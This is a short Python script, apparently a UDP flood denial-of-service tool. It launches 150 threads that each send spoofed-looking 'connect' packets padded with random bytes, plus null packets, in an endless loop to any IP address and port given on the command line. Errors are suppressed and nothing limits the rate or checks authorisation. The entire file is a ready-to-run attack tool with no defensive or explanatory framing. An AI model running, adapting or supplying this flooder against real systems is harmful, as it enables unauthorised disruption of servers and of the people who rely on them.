import socket
import sys
import threading
import os

CONNECTION_REQUEST = b"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xffconnect"

def power_attack(ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    stress_payload = CONNECTION_REQUEST + os.urandom(64)
    
    while True:
        try:
            sock.sendto(stress_payload, (ip, port))
            sock.sendto(b"\x00" * 20, (ip, port))
        except:
            pass

if __name__ == "__main__":
    if len(sys.argv) < 3:
        sys.exit()

    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])

    print(f"[*] Node capacity maximized. Starting power-stress...")

    for _ in range(150):
        t = threading.Thread(target=power_attack, args=(target_ip, target_port))
        t.daemon = True
        t.start()
    
    while True:
        import time
        time.sleep(10)
